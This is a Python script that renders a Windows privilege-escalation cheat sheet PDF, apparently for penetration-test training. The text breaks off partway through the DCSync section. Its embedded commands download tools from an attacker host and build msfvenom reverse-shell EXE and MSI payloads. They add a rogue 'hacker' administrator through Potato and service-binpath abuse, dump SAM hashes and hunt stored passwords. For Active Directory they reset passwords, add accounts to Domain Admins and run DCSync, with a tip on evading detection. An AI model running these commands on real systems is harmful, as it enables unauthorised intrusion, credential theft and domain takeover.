#!/usr/bin/env python3
"""Generate the Windows Privilege Escalation cheatsheet PDF."""

import os
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, HRFlowable, PageBreak, Flowable,
)

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "windows-privesc.pdf")

# ── Colors ────────────────────────────────────────────────────────────────────
C_BODY   = colors.HexColor("#2c2c2a")
C_MUTED  = colors.HexColor("#5f5e5a")
C_ARR    = colors.HexColor("#888780")

C_GRY_BG = colors.HexColor("#F1EFE8")
C_GRY_BR = colors.HexColor("#5F5E5A")
C_GRY_TX = colors.HexColor("#444441")

C_RED_BG = colors.HexColor("#FAECE7")
C_RED_BR = colors.HexColor("#993C1D")
C_RED_TX = colors.HexColor("#712B13")

C_BLU_BG = colors.HexColor("#E6F1FB")
C_BLU_BR = colors.HexColor("#185FA5")
C_BLU_TX = colors.HexColor("#0C447C")

C_GRN_BG = colors.HexColor("#E8F5E9")
C_GRN_BR = colors.HexColor("#2E7D32")
C_GRN_TX = colors.HexColor("#1B5E20")

C_PUR_BG = colors.HexColor("#F3E5F5")
C_PUR_BR = colors.HexColor("#6A1B9A")
C_PUR_TX = colors.HexColor("#4A148C")

C_COD_BG = colors.HexColor("#e8f1fb")
C_COD_BR = colors.HexColor("#b3cde8")
C_DIV    = colors.HexColor("#e8e6df")
C_SHEAD  = colors.HexColor("#444441")

# ── Text styles ───────────────────────────────────────────────────────────────
styles = getSampleStyleSheet()

title_style = ParagraphStyle("Title", parent=styles["Normal"],
    fontSize=18, fontName="Helvetica", spaceAfter=4, textColor=C_BODY)

intro_style = ParagraphStyle("Intro", parent=styles["Normal"],
    fontSize=10, leading=15, textColor=C_MUTED, spaceAfter=12)

label_style = ParagraphStyle("Label", parent=styles["Normal"],
    fontSize=13, fontName="Helvetica-Bold", textColor=C_BODY,
    spaceBefore=14, spaceAfter=5)

section_style = ParagraphStyle("Section", parent=styles["Normal"],
    fontSize=12, fontName="Helvetica-Bold", textColor=colors.white,
    backColor=C_SHEAD, spaceBefore=20, spaceAfter=10,
    leftIndent=-4, rightIndent=-4, borderPad=5)

body_style = ParagraphStyle("Body", parent=styles["Normal"],
    fontSize=10.5, leading=16, textColor=C_BODY, spaceAfter=4)

note_style = ParagraphStyle("Note", parent=styles["Normal"],
    fontSize=10, leading=14, textColor=C_MUTED, fontName="Helvetica-Oblique",
    spaceAfter=4)

code_style = ParagraphStyle("Code", parent=styles["Code"],
    fontSize=9.5, leading=14, fontName="Courier",
    backColor=C_COD_BG, borderColor=C_COD_BR, borderWidth=0.5,
    leftIndent=10, rightIndent=10, borderPad=8, spaceAfter=6)

key_style = ParagraphStyle("Key", parent=styles["Normal"],
    fontSize=10.5, leading=16, textColor=C_MUTED, spaceAfter=4)

HR = HRFlowable(width="100%", thickness=0.8, color=C_DIV, spaceAfter=10, spaceBefore=4)


def sp(n=8):
    return Spacer(1, n)


def code_block(text):
    escaped = (text
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("\n", "<br/>")
        .replace("  ", "&nbsp;&nbsp;"))
    return Paragraph(escaped, code_style)


# ── Diagram Flowable ──────────────────────────────────────────────────────────
class PrivEscDiagram(Flowable):

    def __init__(self, page_width):
        Flowable.__init__(self)
        self.width = page_width
        self._layout()

    def _layout(self):
        """Pre-compute all y positions (bottom-up in ReportLab coords)."""
        PAD = 8
        RH  = 32   # regular row height
        TH  = 44   # tall row height (3-line boxes)
        BH  = 58   # branch box height
        AH  = 13   # arrow/gap height
        CH  = 11   # converge line height

        y = PAD

        # Domain Admin (green, half-width centered)
        self.da_bot = y;  self.DA_H = 32;  y += self.DA_H

        # Converge 2 purple → DA
        self.conv_ad_y   = y;  y += CH
        self.ad_br_arr_y = y;  y += AH   # top of branch arrows going into purple boxes

        # 2 purple AD boxes
        self.ad_br_bot = y;  self.AD_BR_H = BH;  y += BH

        # Gap AD dashed → purple boxes
        self.ad_gap_y = y;  y += AH

        # AD Escalation (gray dashed)
        self.ad_bot = y;  self.AD_H = 36;  y += self.AD_H

        # Arrow SYSTEM → AD
        self.syst_ad_y = y;  y += AH

        # SYSTEM (green)
        self.syst_bot = y;  self.SYST_H = 36;  y += self.SYST_H

        # Converge 3 blue → SYSTEM
        self.conv3_y   = y;  y += CH
        self.br3_arr_y = y;  y += AH   # arrows from H-line into SYST

        # 3 blue technique boxes
        self.br3_bot = y;  self.BR3_H = BH;  y += BH

        # Gap AE → 3 blue boxes (branch area)
        self.ae_br_y = y;  y += AH

        # Automated Enumeration (coral)
        self.ae_bot = y;  self.AE_H = RH;  y += RH

        # Arrow SA → AE
        self.ae_sa_y = y;  y += AH

        # Situational Awareness (coral, taller)
        self.sa_bot = y;  self.SA_H = TH;  y += TH

        # Arrow LB → SA
        self.sa_lb_y = y;  y += AH

        # Land on Windows Box (gray)
        self.lb_bot = y;  self.LB_H = RH;  y += RH

        y += PAD
        self.height = y

    # ── helpers ──────────────────────────────────────────────────────────────

    def _rbox(self, c, x, y, w, h, bg, br, dashed=False, radius=4):
        c.setFillColor(bg)
        c.setStrokeColor(br)
        c.setLineWidth(0.6)
        c.setDash([4, 3] if dashed else [])
        c.roundRect(x, y, w, h, radius, fill=1, stroke=1)
        c.setDash([])

    def _txt(self, c, x, y, text, size=9, bold=False, color=None):
        if color is None:
            color = C_BODY
        c.setFillColor(color)
        c.setFont("Helvetica-Bold" if bold else "Helvetica", size)
        c.drawCentredString(x, y, text)

    def _arrow_down(self, c, x, y_from, y_to):
        """Arrow pointing downward (from higher y to lower y = visually down)."""
        c.setStrokeColor(C_ARR)
        c.setLineWidth(1.1)
        c.setDash([])
        c.line(x, y_from, x, y_to + 5)
        c.setFillColor(C_ARR)
        ph = c.beginPath()
        ph.moveTo(x,       y_to)
        ph.lineTo(x - 3.5, y_to + 6)
        ph.lineTo(x + 3.5, y_to + 6)
        ph.close()
        c.drawPath(ph, fill=1, stroke=0)

    def _hline(self, c, x1, y, x2):
        c.setStrokeColor(C_ARR)
        c.setLineWidth(1.1)
        c.line(x1, y, x2, y)

    def _vline(self, c, x, y1, y2):
        c.setStrokeColor(C_ARR)
        c.setLineWidth(1.1)
        c.line(x, y1, x, y2)

    # ── draw ─────────────────────────────────────────────────────────────────

    def draw(self):
        c   = self.canv
        W   = self.width
        BX  = 20
        BW  = W - 40
        CX  = W / 2

        # ── Column geometry ──────────────────────────────────────────────────

        # 3-column blue boxes
        c3w = (BW - 10) / 3
        c3g = 5
        c3_x = [BX, BX + c3w + c3g, BX + 2 * (c3w + c3g)]
        c3_cx = [x + c3w / 2 for x in c3_x]

        # 2-column purple boxes
        c2w = BW * 0.44
        c2g = BW - 2 * c2w
        c2_x = [BX, BX + c2w + c2g]
        c2_cx = [x + c2w / 2 for x in c2_x]

        # ── Row 1: Land on Windows Box (gray) ──────────────────────────────
        self._rbox(c, BX, self.lb_bot, BW, self.LB_H, C_GRY_BG, C_GRY_BR)
        self._txt(c, CX, self.lb_bot + self.LB_H - 13, "① Land on Windows Box",
                  size=9.5, bold=True, color=C_GRY_TX)
        self._txt(c, CX, self.lb_bot + 6,
                  "smbexec · evil-winrm · meterpreter · RCE foothold",
                  size=8, color=C_GRY_BR)

        # Arrow LB → SA
        self._arrow_down(c, CX, self.lb_bot, self.sa_bot + self.SA_H)

        # ── Row 2: Situational Awareness (coral, 3 lines) ──────────────────
        self._rbox(c, BX, self.sa_bot, BW, self.SA_H, C_RED_BG, C_RED_BR)
        self._txt(c, CX, self.sa_bot + self.SA_H - 13,
                  "② Situational Awareness", size=9.5, bold=True, color=C_RED_TX)
        self._txt(c, CX, self.sa_bot + self.SA_H - 27,
                  "whoami /all · whoami /priv", size=8, color=C_RED_BR)
        self._txt(c, CX, self.sa_bot + 6,
                  "systeminfo · net localgroup administrators", size=8, color=C_RED_BR)

        # Arrow SA → AE
        self._arrow_down(c, CX, self.sa_bot, self.ae_bot + self.AE_H)

        # ── Row 3: Automated Enumeration (coral) ───────────────────────────
        self._rbox(c, BX, self.ae_bot, BW, self.AE_H, C_RED_BG, C_RED_BR)
        self._txt(c, CX, self.ae_bot + self.AE_H - 13,
                  "③ Automated Enumeration", size=9.5, bold=True, color=C_RED_TX)
        self._txt(c, CX, self.ae_bot + 6,
                  "winPEAS  ·  PowerUp (Invoke-AllChecks)  ·  Seatbelt  ·  PrivescCheck",
                  size=7.5, color=C_RED_BR)

        # Branch AE → 3 blue boxes
        branch_y = (self.ae_bot + self.ae_br_y) / 2 + 1  # midpoint of gap
        self._vline(c, CX, self.ae_bot, branch_y)
        self._hline(c, c3_cx[0], branch_y, c3_cx[2])
        for cx in c3_cx:
            self._arrow_down(c, cx, branch_y, self.br3_bot + self.BR3_H)

        # ── Row 4: 3 blue technique boxes ──────────────────────────────────

        # Token Privileges
        self._rbox(c, c3_x[0], self.br3_bot, c3w, self.BR3_H, C_BLU_BG, C_BLU_BR)
        self._txt(c, c3_cx[0], self.br3_bot + self.BR3_H - 13,
                  "Token Privileges", size=9, bold=True, color=C_BLU_TX)
        self._txt(c, c3_cx[0], self.br3_bot + self.BR3_H - 27,
                  "SeImpersonatePriv.", size=7.5, color=C_BLU_BR)
        self._txt(c, c3_cx[0], self.br3_bot + self.BR3_H - 40,
                  "→ PrintSpoofer", size=7.5, color=C_BLU_BR)
        self._txt(c, c3_cx[0], self.br3_bot + 7,
                  "→ GodPotato", size=7.5, color=C_BLU_BR)

        # Service Exploits
        self._rbox(c, c3_x[1], self.br3_bot, c3w, self.BR3_H, C_BLU_BG, C_BLU_BR)
        self._txt(c, c3_cx[1], self.br3_bot + self.BR3_H - 13,
                  "Service Exploits", size=9, bold=True, color=C_BLU_TX)
        self._txt(c, c3_cx[1], self.br3_bot + self.BR3_H - 27,
                  "Unquoted path", size=7.5, color=C_BLU_BR)
        self._txt(c, c3_cx[1], self.br3_bot + self.BR3_H - 40,
                  "Weak binary perms", size=7.5, color=C_BLU_BR)
        self._txt(c, c3_cx[1], self.br3_bot + 7,
                  "Weak service ACL", size=7.5, color=C_BLU_BR)

        # Registry / Creds
        self._rbox(c, c3_x[2], self.br3_bot, c3w, self.BR3_H, C_BLU_BG, C_BLU_BR)
        self._txt(c, c3_cx[2], self.br3_bot + self.BR3_H - 13,
                  "Registry / Creds", size=9, bold=True, color=C_BLU_TX)
        self._txt(c, c3_cx[2], self.br3_bot + self.BR3_H - 27,
                  "AlwaysInstallElevated", size=7.5, color=C_BLU_BR)
        self._txt(c, c3_cx[2], self.br3_bot + self.BR3_H - 40,
                  "cmdkey · AutoLogon", size=7.5, color=C_BLU_BR)
        self._txt(c, c3_cx[2], self.br3_bot + 7,
                  "Sched. tasks · Kernel", size=7.5, color=C_BLU_BR)

        # Converge 3 → SYST
        conv_y = self.conv3_y + (self.br3_bot - self.conv3_y) / 2
        for cx in c3_cx:
            self._vline(c, cx, self.br3_bot, conv_y)
        self._hline(c, c3_cx[0], conv_y, c3_cx[2])
        self._arrow_down(c, CX, conv_y, self.syst_bot + self.SYST_H)

        # ── Row 5: SYSTEM (green) ───────────────────────────────────────────
        self._rbox(c, BX, self.syst_bot, BW, self.SYST_H, C_GRN_BG, C_GRN_BR)
        self._txt(c, CX, self.syst_bot + self.SYST_H - 13,
                  "④ SYSTEM", size=10, bold=True, color=C_GRN_TX)
        self._txt(c, CX, self.syst_bot + 7,
                  r"NT AUTHORITY\SYSTEM — credential dump · pivot",
                  size=8.5, color=C_GRN_BR)

        # Arrow SYST → AD
        self._arrow_down(c, CX, self.syst_bot, self.ad_bot + self.AD_H)

        # ── Row 6: AD Escalation (gray dashed) ─────────────────────────────
        self._rbox(c, BX, self.ad_bot, BW, self.AD_H,
                   C_GRY_BG, C_GRY_BR, dashed=True)
        self._txt(c, CX, self.ad_bot + self.AD_H - 13,
                  "⑤ If Domain-Joined → AD Escalation",
                  size=9.5, bold=True, color=C_GRY_TX)
        self._txt(c, CX, self.ad_bot + 7,
                  "BloodHound + SharpHound → shortest path to Domain Admins",
                  size=8, color=C_GRY_BR)

        # Branch AD → 2 purple boxes
        ad_branch_y = (self.ad_bot + self.ad_br_arr_y) / 2
        self._vline(c, CX, self.ad_bot, ad_branch_y)
        self._hline(c, c2_cx[0], ad_branch_y, c2_cx[1])
        for cx in c2_cx:
            self._arrow_down(c, cx, ad_branch_y, self.ad_br_bot + self.AD_BR_H)

        # ── Row 7: 2 purple AD boxes ────────────────────────────────────────

        # ACL Abuse
        self._rbox(c, c2_x[0], self.ad_br_bot, c2w, self.AD_BR_H, C_PUR_BG, C_PUR_BR)
        self._txt(c, c2_cx[0], self.ad_br_bot + self.AD_BR_H - 13,
                  "ACL Abuse", size=9.5, bold=True, color=C_PUR_TX)
        self._txt(c, c2_cx[0], self.ad_br_bot + self.AD_BR_H - 27,
                  "GenericAll → reset pass", size=8, color=C_PUR_BR)
        self._txt(c, c2_cx[0], self.ad_br_bot + self.AD_BR_H - 41,
                  "WriteDACL → add perms", size=8, color=C_PUR_BR)
        self._txt(c, c2_cx[0], self.ad_br_bot + 7,
                  "Add self to DA group", size=8, color=C_PUR_BR)

        # DCSync
        self._rbox(c, c2_x[1], self.ad_br_bot, c2w, self.AD_BR_H, C_PUR_BG, C_PUR_BR)
        self._txt(c, c2_cx[1], self.ad_br_bot + self.AD_BR_H - 13,
                  "DCSync", size=9.5, bold=True, color=C_PUR_TX)
        self._txt(c, c2_cx[1], self.ad_br_bot + self.AD_BR_H - 27,
                  "secretsdump → all hashes", size=8, color=C_PUR_BR)
        self._txt(c, c2_cx[1], self.ad_br_bot + self.AD_BR_H - 41,
                  "→ Pass-the-Hash", size=8, color=C_PUR_BR)
        self._txt(c, c2_cx[1], self.ad_br_bot + 7,
                  "→ full domain", size=8, color=C_PUR_BR)

        # Converge 2 → DA
        da_conv_y = self.conv_ad_y + (self.ad_br_bot - self.conv_ad_y) / 2
        for cx in c2_cx:
            self._vline(c, cx, self.ad_br_bot, da_conv_y)
        self._hline(c, c2_cx[0], da_conv_y, c2_cx[1])
        self._arrow_down(c, CX, da_conv_y, self.da_bot + self.DA_H)

        # ── Row 8: Domain Admin (green, centered half-width) ────────────────
        da_w = BW * 0.5
        da_x = BX + BW * 0.25
        self._rbox(c, da_x, self.da_bot, da_w, self.DA_H, C_GRN_BG, C_GRN_BR)
        self._txt(c, CX, self.da_bot + self.DA_H - 13,
                  "⑥ Domain Admin", size=10, bold=True, color=C_GRN_TX)
        self._txt(c, CX, self.da_bot + 7,
                  "DCSync · persistence · full domain access",
                  size=8, color=C_GRN_BR)

    def wrap(self, availW, availH):
        return self.width, self.height


# ── Build the story ───────────────────────────────────────────────────────────
PAGE_W = letter[0] - 2 * 0.85 * inch   # available content width

story = []

# ── Page 1: Title + Intro + Diagram ──────────────────────────────────────────
story.append(Paragraph(
    "Windows Privilege Escalation — Cheat Sheet",
    title_style,
))
story.append(Paragraph(
    "Escalate from a low-privilege shell to SYSTEM or Domain Admin. "
    "Run automated tools first — they surface the vector. "
    "Then follow the technique that applies. "
    "Replace &lt;placeholders&gt; with your own values.",
    intro_style,
))

story.append(PrivEscDiagram(PAGE_W))
story.append(PageBreak())

# ── Page 2+: Steps ───────────────────────────────────────────────────────────

# ── PART 1 ───────────────────────────────────────────────────────────────────
story.append(Paragraph("① Situational Awareness", label_style))
story.append(Paragraph(
    "First thing after landing a shell — understand your context "
    "and what privileges you already have.",
    body_style,
))
story.append(code_block(
    "whoami                               # current user\n"
    "whoami /all                          # user, groups, and ALL privileges\n"
    "whoami /priv                         # privileges only — the key thing to check\n"
    "systeminfo                           # OS build, hotfixes, domain membership\n"
    "net localgroup administrators        # who has local admin?\n"
    "net user                             # all local accounts\n"
    "hostname\n"
    "ipconfig /all"
))
story.append(Paragraph(
    "<b>SeImpersonatePrivilege</b> or <b>SeAssignPrimaryTokenPrivilege</b> "
    "in whoami /priv = almost certainly exploitable via Potato attacks. Jump straight to Step ③.",
    note_style,
))
story.append(HR)

story.append(Paragraph("② Automated Enumeration", label_style))
story.append(Paragraph(
    "Transfer tools from Kali, then run. These catch 90% of vectors automatically.",
    body_style,
))
story.append(Paragraph("<b>Transfer tools from Kali:</b>", body_style))
story.append(code_block(
    "# Serve files on Kali:\n"
    "python3 -m http.server 80\n"
    "\n"
    "# Download on victim (CMD):\n"
    "certutil -urlcache -f http://&lt;kali-ip&gt;/winPEASx64.exe winPEAS.exe\n"
    "\n"
    "# Download on victim (PowerShell):\n"
    "iwr http://&lt;kali-ip&gt;/PowerUp.ps1 -o PowerUp.ps1\n"
    "\n"
    "# Via evil-winrm:\n"
    "upload /path/to/winPEASx64.exe"
))
story.append(Paragraph(
    "<b>winPEAS</b> — most comprehensive, color-coded (yellow = interesting, red = critical):",
    body_style,
))
story.append(code_block(".\\winPEASx64.exe"))
story.append(Paragraph(
    "<b>PowerUp</b> — service and registry focused:",
    body_style,
))
story.append(code_block(
    'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"'
))
story.append(Paragraph("<b>Seatbelt</b> — detailed system audit:", body_style))
story.append(code_block(".\\Seatbelt.exe -group=all"))
story.append(Paragraph("<b>PrivescCheck</b> — no dependencies:", body_style))
story.append(code_block(
    'powershell -ep bypass -c ". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"'
))
story.append(Paragraph(
    "Run winPEAS first — it covers the most ground. "
    "PowerUp is faster and specifically targets service/registry vectors.",
    note_style,
))
story.append(HR)

story.append(Paragraph("③ SeImpersonatePrivilege — Potato Attacks", label_style))
story.append(Paragraph(
    "Service accounts (IIS, SQL Server, network services) almost always have "
    "<b>SeImpersonatePrivilege</b>. "
    "If you land as one, SYSTEM is one command away.",
    body_style,
))
story.append(code_block(
    "whoami /priv    # look for: SeImpersonatePrivilege  or  SeAssignPrimaryTokenPrivilege"
))
story.append(Paragraph(
    "<b>PrintSpoofer</b> — Windows 10 / Server 2016 and later:",
    body_style,
))
story.append(code_block(
    ".\\PrintSpoofer64.exe -i -c cmd\n"
    ".\\PrintSpoofer64.exe -c \"net user hacker P@ss123! /add && net localgroup administrators hacker /add\""
))
story.append(Paragraph(
    "<b>GodPotato</b> — most universal (Windows 2012–2022, Windows 8–11):",
    body_style,
))
story.append(code_block(
    ".\\GodPotato-NET4.exe -cmd \"whoami\"\n"
    ".\\GodPotato-NET4.exe -cmd \"cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add\""
))
story.append(Paragraph(
    "<b>JuicyPotato</b> — older systems (Server 2012/2016, Win 7/8/10 pre-1809):",
    body_style,
))
story.append(code_block(
    ".\\JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c whoami\" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}"
))
story.append(Paragraph(
    "JuicyPotato needs a CLSID for the specific OS — "
    "find them at github.com/ohpe/juicy-potato/tree/master/CLSID. "
    "PrintSpoofer and GodPotato are simpler and preferred for modern systems.",
    note_style,
))
story.append(Paragraph(
    "<b>SeBackupPrivilege</b> — dump SAM without admin rights:",
    body_style,
))
story.append(code_block(
    "reg save HKLM\\SAM sam.hive\n"
    "reg save HKLM\\SYSTEM system.hive\n"
    "\n"
    "# Transfer both files to Kali, then:\n"
    "impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
))
story.append(Paragraph(
    "NT hashes from SAM → use for Pass-the-Hash. See the PtH cheatsheet.",
    note_style,
))
story.append(HR)

story.append(Paragraph("④ Service Exploits", label_style))
story.append(Paragraph("<b>4a — Unquoted Service Paths</b>", body_style))
story.append(Paragraph(
    "If a service path contains spaces and is not quoted, Windows tries to execute "
    "each space-split segment as a binary. Drop a payload at the ambiguous location.",
    body_style,
))
story.append(code_block(
    "# Find auto-start services with unquoted paths containing spaces:\n"
    'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "c:\\windows" | findstr /v """"\n'
    "\n"
    "# PowerUp:\n"
    'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Get-UnquotedService"'
))
story.append(Paragraph("Exploit — place payload at the ambiguous location, then restart:", body_style))
story.append(code_block(
    "# If path is: C:\\Program Files\\My App\\service.exe\n"
    "# → try placing payload at: C:\\Program.exe  or  C:\\Program Files\\My.exe\n"
    "\n"
    "sc stop &lt;service-name&gt;\n"
    "sc start &lt;service-name&gt;\n"
    "\n"
    "# Or let PowerUp do it:\n"
    "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Write-ServiceBinary -ServiceName '&lt;svc&gt;' -UserName hacker -Password P@ss123!\""
))
story.append(sp(6))
story.append(Paragraph("<b>4b — Weak Service Binary Permissions</b>", body_style))
story.append(Paragraph(
    "If your user can overwrite the binary a service runs, replace it with a payload.",
    body_style,
))
story.append(code_block(
    "# Check write permissions on the service binary:\n"
    "icacls \"C:\\path\\to\\service.exe\"\n"
    "# Look for: BUILTIN\\Users:(F) or (W)\n"
    "\n"
    "# PowerUp:\n"
    'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Get-ModifiableServiceFile"'
))
story.append(code_block(
    "# On Kali — create payload:\n"
    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;kali-ip&gt; LPORT=&lt;port&gt; -f exe -o evil.exe\n"
    "\n"
    "# On victim — replace and restart:\n"
    "copy evil.exe \"C:\\path\\to\\service.exe\"\n"
    "sc stop &lt;service-name&gt;\n"
    "sc start &lt;service-name&gt;"
))
story.append(sp(6))
story.append(Paragraph("<b>4c — Weak Service ACLs (Modify binpath)</b>", body_style))
story.append(Paragraph(
    "If your user has write access to a service's configuration, "
    "change binpath to run any command as SYSTEM.",
    body_style,
))
story.append(code_block(
    "# Find services writable by your user:\n"
    ".\\accesschk.exe /accepteula -uwcqv &lt;username&gt; *\n"
    "\n"
    "# PowerUp:\n"
    'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Get-ModifiableService"'
))
story.append(Paragraph("Exploit — two restart cycles (each sc start runs one command):", body_style))
story.append(code_block(
    "sc config &lt;service-name&gt; binpath= \"cmd.exe /c net user hacker P@ss123! /add\"\n"
    "sc stop &lt;service-name&gt;\n"
    "sc start &lt;service-name&gt;\n"
    "\n"
    "sc config &lt;service-name&gt; binpath= \"cmd.exe /c net localgroup administrators hacker /add\"\n"
    "sc stop &lt;service-name&gt;\n"
    "sc start &lt;service-name&gt;"
))
story.append(Paragraph(
    "Note the space after <font name='Courier'>binpath=</font> — it is required. "
    "Each sc start runs exactly one command.",
    note_style,
))
story.append(HR)

story.append(Paragraph("⑤ AlwaysInstallElevated", label_style))
story.append(Paragraph(
    "When both registry keys are set to 1, any user can install MSI packages as SYSTEM.",
    body_style,
))
story.append(code_block(
    "# Both keys must return 0x1:\n"
    "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
    "\n"
    "# PowerUp check:\n"
    'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Get-RegistryAlwaysInstallElevated"'
))
story.append(Paragraph("If both return <font name='Courier'>0x1</font>:", body_style))
story.append(code_block(
    "# On Kali — create MSI payload:\n"
    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;kali-ip&gt; LPORT=&lt;port&gt; -f msi -o evil.msi\n"
    "\n"
    "# On victim — installs as SYSTEM:\n"
    "msiexec /quiet /qn /i evil.msi"
))
story.append(HR)

story.append(Paragraph("⑥ Stored Credentials", label_style))
story.append(Paragraph("<b>AutoLogon credentials in registry:</b>", body_style))
story.append(code_block(
    "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n"
    "# Look for: DefaultUserName, DefaultPassword, DefaultDomainName"
))
story.append(Paragraph("<b>Saved credentials (cmdkey):</b>", body_style))
story.append(code_block(
    "cmdkey /list\n"
    "runas /savecred /user:&lt;domain&gt;\\&lt;username&gt; cmd.exe"
))
story.append(Paragraph("<b>Registry password hunt:</b>", body_style))
story.append(code_block(
    "reg query HKLM /f password /t REG_SZ /s\n"
    "reg query HKCU /f password /t REG_SZ /s"
))
story.append(Paragraph(
    "<b>Unattended install files</b> (often contain base64-encoded passwords):",
    body_style,
))
story.append(code_block(
    "type C:\\Windows\\Panther\\Unattend.xml\n"
    "type C:\\Windows\\Panther\\Unattended.xml\n"
    "type C:\\Windows\\System32\\sysprep\\sysprep.xml"
))
story.append(Paragraph(
    "Passwords in Unattend.xml are base64-encoded. Decode on Kali: "
    "<font name='Courier'>echo &lt;base64&gt; | base64 -d</font>",
    note_style,
))
story.append(HR)

story.append(Paragraph("⑦ Scheduled Tasks", label_style))
story.append(Paragraph(
    "If a task runs as SYSTEM and its binary is writable, replace it and wait for the next trigger.",
    body_style,
))
story.append(code_block(
    "# List all tasks with their run-as context:\n"
    "schtasks /query /fo LIST /v | findstr /i \"task name\\|run as user\\|task to run\"\n"
    "\n"
    "# Check write permissions on the task binary:\n"
    "icacls \"C:\\path\\to\\task\\binary.exe\"\n"
    "# BUILTIN\\Users:(W) or (F) = writable\n"
    "\n"
    "# Replace binary with payload:\n"
    "copy evil.exe \"C:\\path\\to\\task\\binary.exe\"\n"
    "\n"
    "# PowerUp:\n"
    'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Get-ModifiableScheduledTaskFile"'
))
story.append(Paragraph(
    "Tasks triggered on login or system start are faster than time-based triggers. "
    "Check 'Schedule Type' and 'Next Run Time' fields.",
    note_style,
))
story.append(HR)

story.append(Paragraph("⑧ Kernel Exploits (Last Resort)", label_style))
story.append(Paragraph(
    "Check the OS build and hotfixes against known CVEs. "
    "Use only if other vectors fail — kernel exploits can crash the system.",
    body_style,
))
story.append(code_block(
    "# Dump system info on victim:\n"
    "systeminfo &gt; sysinfo.txt\n"
    "\n"
    "# On Kali — check against known CVEs:\n"
    "python3 wesng.py --update\n"
    "python3 wesng.py sysinfo.txt"
))
story.append(Paragraph("Notable exploits to check:", body_style))
story.append(code_block(
    "CVE-2021-1675 / 34527   PrintNightmare   spooler -&gt; SYSTEM  (Win10 / Server 2019)\n"
    "CVE-2021-36934          HiveNightmare    read SAM as low-priv (Win10 21H1+)\n"
    "CVE-2020-0796           SMBGhost         local RCE            (Win10 1903/1909)\n"
    "MS16-032                                 secondary logon      (Win7 - Win10)"
))
story.append(Paragraph(
    "WES-NG: github.com/bitsadmin/wesng. "
    "Watson / SharpUp can also check directly on the victim without file transfer.",
    note_style,
))
story.append(HR)

# ── PART 2: AD Escalation ─────────────────────────────────────────────────────
story.append(Paragraph("AD ESCALATION — Domain-Joined Machines", section_style))

story.append(Paragraph("⑨ BloodHound — AD Path Mapping", label_style))
story.append(Paragraph(
    "Run BloodHound as soon as you have any domain credential. "
    "It maps the entire AD and finds the shortest path to Domain Admin visually.",
    body_style,
))
story.append(Paragraph("<b>From Kali</b> (no Windows foothold needed):", body_style))
story.append(code_block(
    "bloodhound-python -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -dc &lt;dc-fqdn&gt; -c all --zip"
))
story.append(Paragraph("<b>From Windows foothold</b> (SharpHound):", body_style))
story.append(code_block(
    ".\\SharpHound.exe -c all --zipfilename bloodhound.zip\n"
    "# Transfer zip to Kali → drag-drop into BloodHound GUI"
))
story.append(Paragraph("Key built-in queries:", body_style))
story.append(code_block(
    "Shortest Paths to Domain Admins\n"
    "Find Principals with DCSync Rights\n"
    "Find Computers where Domain Admins are Logged On\n"
    "Kerberoastable Users with Paths to DA"
))
story.append(HR)

story.append(Paragraph("⑩ ACL Abuse", label_style))
story.append(Paragraph(
    "BloodHound surfaces the exact ACL edge. "
    "Common edges: GenericAll, WriteDACL, WriteOwner, AddMember.",
    body_style,
))
story.append(Paragraph(
    "<b>GenericAll on a user</b> → force a password reset:",
    body_style,
))
story.append(code_block(
    "net rpc password \"&lt;target-user&gt;\" \"NewPass123!\" -U \"&lt;domain&gt;/&lt;your-user&gt;%&lt;your-pass&gt;\" -S &lt;dc-ip&gt;\n"
    "\n"
    "# PowerView:\n"
    "Set-DomainUserPassword -Identity &lt;target-user&gt; -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)"
))
story.append(Paragraph(
    "<b>GenericAll on a group</b> → add yourself as a member:",
    body_style,
))
story.append(code_block(
    "net rpc group addmem \"Domain Admins\" \"&lt;your-user&gt;\" -U \"&lt;domain&gt;/&lt;your-user&gt;%&lt;your-pass&gt;\" -S &lt;dc-ip&gt;\n"
    "\n"
    "# PowerView:\n"
    "Add-DomainGroupMember -Identity 'Domain Admins' -Members '&lt;your-user&gt;'"
))
story.append(Paragraph(
    "<b>WriteDACL on an object</b> → grant yourself GenericAll:",
    body_style,
))
story.append(code_block(
    "# PowerView:\n"
    "Add-DomainObjectAcl -TargetIdentity \"&lt;target&gt;\" -PrincipalIdentity \"&lt;your-user&gt;\" -Rights All"
))
story.append(Paragraph(
    "ACL changes are logged. If stealth matters, revert: "
    "<font name='Courier'>Remove-DomainObjectAcl</font>.",
    note_style,
))
story.append(HR)

story.append(Paragraph("⑪ DCSync", label_style))
story.append(Paragraph(
    "Dump all domain password hashes directly from the DC "
    "without touching LSASS. "
    "Requires: Domain Admin, or an account with Replicating Directory Changes rights.",
    body_style,
))
story.append(Paragraph("<b>From Kali (Impacket — recommended):</b>", body_style))
story.append(code_block(
    "# With plaintext password:\n"
    "impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;dc-ip&gt;\n"
    "\n"
    "# With NT hash (no plaintext needed):\n"
